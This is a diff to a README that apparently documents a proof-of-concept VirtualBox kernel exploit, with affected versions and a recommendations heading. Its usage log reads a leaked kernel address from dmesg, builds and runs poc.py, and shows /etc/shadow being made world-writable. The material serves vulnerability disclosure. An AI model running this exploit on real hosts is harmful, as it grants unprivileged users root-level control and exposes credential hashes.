@@ -99,18 +99,26 @@ You need to have python3.5 and python3-pwntools installed (you must be on the
 `rop_load_add_register_to_stack` branch in pdxjohnny's fork or wait for it to
 be merged into master).
 
+You need to start a virtual machine and make sure that the driver VMMR0.r0
+has loaded by looking in dmesg. After you start dmesg there will be a line
+near the bottom of the output that says vboxdrv: <leaked address> VMMR0.r0.
+This will definetly happen on VirtualBox version 5.1.0 and 5.1.2.
+
 ```log
 $ ls -lAf /etc/shadow
 -rw------- 1 root root 806 Aug 29 17:12 /etc/shadow
-$ ./poc.py kernel VMMR0.r0 payload
+$ rm Makefile
+$ ln -s Makefile.vbox3 Makefile
+$ make clean all
+$ ./poc.py kernel VMMR0.r0 payload 30
 $ ls -lAf /etc/shadow
 -rw-rw-rw- 1 root root 806 Aug 29 17:12 /etc/shadow
 ```
 
 ## Impact
 
-This affects VirtualBox version 5.0.14 and beyond so far was we know. Perhaps
-earlier versions as well.
+This affects VirtualBox version 5.1.0 and beyond so far was we know. And all
+earlier 32-bit versions.
 
 ## Recommendations
 
